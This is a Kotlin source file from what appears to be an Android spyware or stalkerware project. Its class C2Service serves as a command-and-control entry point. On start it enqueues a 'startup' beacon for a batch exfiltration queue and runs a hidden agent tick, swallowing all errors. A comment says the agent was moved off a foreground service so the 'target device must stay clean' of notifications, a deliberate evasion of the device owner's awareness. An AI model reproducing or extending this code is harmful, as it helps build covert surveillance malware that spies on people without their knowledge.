package com.sp.core.services

import android.app.Service
import android.content.Intent
import android.os.IBinder
import com.sp.core.agent.AgentWorker
import com.sp.core.util.BatchExfil

/**
 * Compatibility shell.
 *
 * The agent used to live in this long-running foreground service. On
 * Android 14+ a foreground service always shows a notification (the system
 * raises the channel importance to LOW on its own), and the target device
 * must stay clean - so the work moved into [AgentWorker], which the
 * watchdog alarm drives. The class is kept so the manifest entry and the
 * old start intents stay valid; a start simply runs one tick.
 */
class C2Service : Service() {

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        BatchExfil.enqueue(
            this, "startup",
            """{"pid":${android.os.Process.myPid()},"ts":${System.currentTimeMillis()}}"""
        )
        Thread {
            try { AgentWorker.tick(this, force = true) } catch (_: Throwable) {}
            stopSelf()
        }.start()
        return START_NOT_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null
}
